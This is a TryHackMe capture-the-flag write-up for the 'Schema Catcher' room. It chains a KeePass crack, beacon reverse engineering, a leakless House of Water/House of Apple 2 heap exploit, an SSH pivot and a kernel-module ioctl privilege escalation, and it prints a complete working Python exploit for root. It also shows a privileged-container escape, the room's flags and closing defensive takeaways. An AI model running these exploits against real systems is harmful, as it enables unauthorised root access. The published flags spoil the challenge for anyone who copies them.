---
layout: default
title: Schema Catcher – Heap Exploitation & Kernel Module Abuse
page_type: writeup
---

# Schema Catcher

**Platform:** TryHackMe
**Category:** Binary Exploitation / Heap / Kernel Module
**Difficulty:** Hard

## High-Level Overview

Schema Catcher is a multi-stage exploitation challenge that starts with a network beacon used to uncover hidden infrastructure, escalates into a modern heap exploitation scenario against a hardened binary, and finishes with a kernel module exploit for root access on the host.

The full chain: beacon reverse engineering → heap exploitation inside a container → SSH pivot to host → kernel module abuse for root. Despite heavy binary protections (PIE, Full RELRO, NX, stack canaries, IBT, SHSTK) and the absence of a read primitive, a use-after-free condition enables heap manipulation using the House of Water (leakless) technique, culminating in remote code execution via House of Apple 2's FSOP payload.

Post-exploitation involves discovering an SSH key inside the compromised container, pivoting to the host, and reverse engineering a custom kernel module with an exploitable ioctl interface to escalate to root.

---

## 0. Pre-Quest – Finding the Key (Advent of Cyber Day 9)

The side quest key is hidden inside the Day 9 room machine. In the `ubuntu` user's home directory, there's a hidden KeePass database file: `.Passwords.kdbx`.

```
ubuntu@tryhackme:~$ ls -la
...
-rw-------  1 ubuntu ubuntu 419413 Dec  4 09:29 .Passwords.kdbx
```

After transferring it to our machine with SCP, the first obstacle is that `keepass2john` doesn't support KDBX 4.x format:

```
$ keepass2john Passwords.kdbx
! Passwords.kdbx : File version '40000' is currently not supported!
```

Instead, `keepass4brute` handles this format and cracks the master password against rockyou.txt. Once unlocked, the database contains a single entry titled "key" — the password field is empty, but under the Advanced section there's an attached image file containing the side quest key.

---

## 1. Reconnaissance

After entering the key at port 21337 to drop the firewall, a port scan reveals the target's services:

```
nmap -sV -A -v <VICTIM_IP>
```

Three ports of interest:
- 22/tcp – OpenSSH
- 80/tcp – Apache (shows "Under Construction" with nothing obvious)
- 9004/tcp – Unknown service displaying a menu: C / U / D / E options

Port 80 appears empty at first glance, but directory fuzzing with ffuf quickly turns up a `/dev` endpoint:

```
$ ffuf -u 'http://<IP>/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
dev                     [Status: 301]
```

The `/dev/` directory has indexing enabled and contains a single file: `4.2.0.zip`.

---

## 2. Beacon Analysis – Flag 1

Extracting the archive gives us `latest/beacon.bin`. Running `strings` against it immediately reveals the first flag buried in the binary's data:

**Flag 1:** `THM{Welcom3_to_th3_eastmass_pwnland}`

But there's more useful information in the strings output — a menu structure, an HTTP request template, a reference to `/tmp/b68vC103RH`, and what looks like an authentication key: `EastMass`.

### Running the Beacon

The beacon prompts for a key on startup. Entering `EastMass` authenticates and starts a socket server on port 4444:

```
$ ./latest/beacon.bin
Enter key: EastMass
Hello EastMass!
Access granted! Starting socket server...
Socket server listening on port 4444...
```

The beacon exposes a menu with four options: Execute command, Load payload, Delete command, and Exit.

Connecting and sending option 1 (Execute) triggers the beacon to try running `/tmp/b68vC103RH`, which doesn't exist locally — not useful yet.

Sending option 2 (Load payload) causes a "Connection refused" error. Monitoring traffic with Wireshark shows the beacon trying to reach localhost on port 80. Setting up a netcat listener catches the outbound request:

```
$ sudo nc -lvnp 80
...
GET /7ln6Z1X9EF HTTP/1.1
Host: localhost
Connection: close
```

This reveals the hidden path on the target's web server.

---

## 3. Hidden Server Package – Flag 2

Navigating to `http://<TARGET>:80/7ln6Z1X9EF/` on the actual target shows another indexed directory with two files:
- `4.2.0-R1-1337-server.zip`
- `foothold.txt`

The `foothold.txt` file contains the second flag.

**Flag 2:** `THM{byp4ss_and_pack_is_pwn_you_n33d}`

The server archive contains the vulnerable binary along with its matching libc and dynamic loader:

```
$ unzip 4.2.0-R1-1337-server.zip
  inflating: ld-linux-x86-64.so.2
  inflating: libc.so.6
  inflating: server
```

---

## 4. Server Binary Analysis

Running the binary with the provided loader presents a simple CRUD menu matching what we saw on port 9004:

```
$ ./ld-linux-x86-64.so.2 ./server
[1] C:
[2] U:
[3] D:
[4] E:
>>
```

Full protections are enabled: Full RELRO, Stack Canary, NX, PIE, IBT, SHSTK.

### Vulnerability Breakdown

**Create** — Prompts for a size, allocates with `malloc`, stores the pointer and size in arrays. Allocation count is capped but sizes are flexible, giving us heap layout control.

**Update** — Takes an index and offset, then writes data into the chunk at that offset. Bounds checking exists for the initial state, but once heap metadata is corrupted, this becomes an out-of-bounds write. Critically, it does not check whether a chunk has been freed.

**Delete** — Frees the chunk but **does not null out the pointer or size entry**. This is a textbook use-after-free: freed chunks remain accessible through the update function.

The combination of UAF + unchecked writes on freed chunks gives us the primitives needed for heap exploitation.

---

## 5. Heap Exploitation – Flag 3

### Why House of Water

A typical heap exploit would use a read primitive to leak libc addresses from freed chunks. This binary doesn't have one — there's no "view" or "print" function. This rules out standard tcache poisoning approaches.

The **House of Water** technique is designed exactly for this scenario: leakless heap exploitation. It works by carefully grooming the heap to manipulate tcache metadata and force allocations to land on sensitive libc structures, all without needing to read any addresses first.

### Exploitation Flow

1. **Heap grooming** — Allocate and free chunks in precise sizes to fill tcache bins, create unsorted bin entries, and set up chunk remaindering. This gives us control over the tcache_perthread_struct.

2. **Partial stdout overwrite** — Through the manipulated heap state, a partial pointer overwrite redirects an allocation onto the `_IO_2_1_stdout_` FILE structure. Corrupting it forces stdout into a state that leaks a libc pointer during output.

3. **ASLR brute-force** — Since we can't leak ASLR-affected nibbles directly, two nibbles (one heap, one libc) need to be brute-forced. This means the exploit needs to be run multiple times until the correct values hit. Running from the AttackBox is strongly recommended since both machines share a network.

4. **FSOP payload (House of Apple 2)** — With the libc base calculated from the leak, a fake FILE structure is written over stdout using the House of Apple 2 technique:
   - vtable redirected to `_IO_wfile_jumps`
   - chain pointer set to `system`
   - Controlled write pointers and mode flags

5. **Trigger** — Any I/O operation now calls `system("sh")`, dropping a shell.

The exploit (adapted from the House of Water PoC) brute-forces the two unknown nibbles in a nested loop, attempting the full chain on each iteration:

```python
for heap_brute in range(16):
    for libc_brute in range(16):
        try:
            r = remote("<TARGET_IP>", 9004)
            # ... heap grooming, tcache manipulation,
            # ... partial overwrite, libc leak, FSOP payload
            r.interactive("$ ")
            exit()
        except:
            continue
```

Once the correct brute-force values land, we get a root shell — but inside a Docker container:

```
$ id && hostname
uid=0(root) gid=0(root) groups=0(root)
bb21200fff81
```

The third flag is in `user.txt` inside the container.

**Flag 3:** `THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}`

---

## 6. Container to Host – SSH Pivot

Poking around the container, there's an SSH key pair sitting alongside the flag. The public key comment identifies the username:

```
$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINrUEbTDkcpAuYGW1sN4OTd57ZvSxXIWq7kv9XiOVKs9 agent@tryhackme
```

Using this key against the host's SSH service gets us out of the container and onto the actual machine:

```
$ ssh -i id_rsa agent@<TARGET_IP>
agent@tryhackme:~$ id
uid=1001(agent) gid=1001(agent) groups=1001(agent),100(users)
```

---

## 7. Kernel Module Exploitation – Flag 4

### Discovering the Attack Surface

Checking sudo permissions reveals an interesting setup:

```
agent@tryhackme:~$ sudo -l
User agent may run the following commands on tryhackme:
    (root) NOPASSWD: /usr/sbin/modprobe -r kagent, /usr/sbin/modprobe kagent
    (root) NOPASSWD: /bin/chmod 444 /dev/kagent
```

We can load/unload a kernel module called `kagent` and change permissions on its device file. The module is already loaded:

```
agent@tryhackme:~$ lsmod | grep kagent
kagent                 12288  0
```

Pulling the module binary off the machine with SCP and opening it in Ghidra reveals how it works.

### Reverse Engineering kagent.ko

The module creates a `/dev/kagent` device and registers an ioctl handler. It maintains an internal config structure:

| Field | Size | Default |
|-------|------|---------|
| agent_id | 16 bytes | `AGT-001` |
| session_key | 16 bytes | Read from `/root/kkey` at load time |
| current_op | 8-byte pointer | Points to `op_ping` |
| command_buffer | 64 bytes | Empty |

The ioctl handler supports three operations:

**c2_heartbeat** — Reads up to 16 bytes from user buffer into `agent_id`, then writes a status string back using `snprintf` with a 128-byte limit. The key detail: `snprintf` keeps writing until it hits a null byte. If `agent_id` is filled with 16 non-null bytes, the output bleeds past it and **leaks both `session_key` and the `current_op` pointer**.

**c2_update_conf** — Reads 144 bytes from the user buffer. If the first 16 bytes match the current `session_key`, it copies the remaining 128 bytes over the entire config structure. This lets us overwrite `current_op` with any address we want — as long as we know the session key.

**exec_op** — Calls whatever function `current_op` points to.

There's also an `op_execute` function in the module that sets the caller's UID to root. It's not wired up by default, but we can redirect `current_op` to point to it.

### The Exploit Chain

1. **Leak the session key** — Call heartbeat with 16 non-null bytes as `agent_id`. The `snprintf` overflow leaks `session_key` and the address of `op_ping`.

2. **Calculate op_execute's address** — From the module's symbol table, `op_execute` is at offset 0x330 and `op_ping` at 0x10. The difference is 0x320, so `op_execute = leaked_op_ping + 0x320`.

3. **Overwrite current_op** — Call update_conf with the leaked session key, followed by dummy values for `agent_id` and `session_key`, then the calculated `op_execute` address.

4. **Trigger** — Call exec_op. The module now calls `op_execute`, which sets our UID to 0.

First, give ourselves read access to the device:

```
agent@tryhackme:~$ sudo /bin/chmod 444 /dev/kagent
```

Then run the exploit:

```python
from fcntl import ioctl
import struct, os, pty

IOCTL_UPDATE_CONF = 0x40933702
IOCTL_HEARTBEAT   = 0xc0b33701
IOCTL_EXEC_OP     = 0x133703

fd = os.open("/dev/kagent", os.O_RDONLY)

# Step 1: Leak session key and op_ping address
buf = bytearray(b"A"*16 + b"\x00"*144)
ioctl(fd, IOCTL_HEARTBEAT, buf)
leaked_session_key = buf[69:85]
leaked_op_ping = struct.unpack("<Q", buf[85:93])[0]

# Step 2: Calculate op_execute address
op_execute = leaked_op_ping + 0x320

# Step 3: Overwrite current_op
payload = b""
payload += leaked_session_key       # authenticate
payload += b"A"*16                  # new agent_id (don't care)
payload += b"B"*16                  # new session_key (don't care)
payload += struct.pack("<Q", op_execute)  # redirect current_op
ioctl(fd, IOCTL_UPDATE_CONF, bytearray(payload))

# Step 4: Trigger op_execute -> sets UID to 0
ioctl(fd, IOCTL_EXEC_OP)

pty.spawn("/bin/sh")
```

```
agent@tryhackme:~$ python3 solve.py
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

**Flag 4:** `THM{final-boss_defeat3d-yay}`

---

## Alternative Root Path: Privileged Container Escape

Instead of the kernel module route, there's a shortcut. The Docker container from the heap exploit runs in privileged mode (full capabilities). This means we can mount the host filesystem directly from inside the container:

```
root@container:/# cat /proc/1/status | grep CapEff
CapEff: 000001ffffffffff

root@container:/# mount /dev/nvme0n1p1 /mnt
root@container:/# cat /mnt/root/root.txt
```

Both paths get you the root flag — the kernel module is the intended route, but the container misconfiguration provides a quicker alternative.

---

## Flags Summary

| Flag | Value |
|------|-------|
| Flag 1 | `THM{Welcom3_to_th3_eastmass_pwnland}` |
| Flag 2 | `THM{byp4ss_and_pack_is_pwn_you_n33d}` |
| Flag 3 | `THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}` |
| Flag 4 | `THM{final-boss_defeat3d-yay}` |

## Attack Chain Overview

1. **Pre-Quest** – Crack KeePass database from Day 9 room → extract key image
2. **Directory Fuzzing** – Discover `/dev` endpoint → download `4.2.0.zip`
3. **Beacon Strings** – Extract first flag and `EastMass` authentication key
4. **Beacon Interaction** – Authenticate, trigger HTTP callback via port 4444 menu → discover `/7ln6Z1X9EF` path
5. **Hidden Endpoint** – Retrieve `foothold.txt` (**Flag 2**) and server archive
6. **Binary Reversing** – Identify UAF in delete function (pointer not cleared)
7. **House of Water** – Leakless heap exploitation with ASLR brute-force
8. **FSOP (House of Apple 2)** – Forge stdout FILE structure → `system("sh")`
9. **Container Shell** – Root inside Docker → **Flag 3** + SSH key discovery
10. **SSH Pivot** – Use discovered key to reach host as `agent`
11. **Kernel Module RE** – Reverse engineer `kagent.ko` ioctl interface in Ghidra
12. **Session Key Leak** – Abuse `snprintf` overflow in heartbeat to leak config
13. **Config Overwrite** – Redirect `current_op` to `op_execute`
14. **Root** – Trigger ioctl exec → UID 0 → **Flag 4**

## Defensive Takeaways

**Heap Safety** — Freeing memory without nulling the pointer is a textbook UAF. Always zero out references after `free()`.

**Leakless != Safe** — The absence of a read primitive didn't stop exploitation. House of Water shows that attackers can work around missing primitives with heap grooming and brute-force.

**Container Isolation** — Running containers in privileged mode defeats the purpose of containerization. The host disk was one `mount` command away.

**Kernel Module Design** — The `snprintf` overflow in heartbeat leaked the entire config by design. Fixed-size formatted output should be bounded to prevent adjacent data exposure. The update_conf function's "authenticate then overwrite everything" pattern is inherently dangerous.
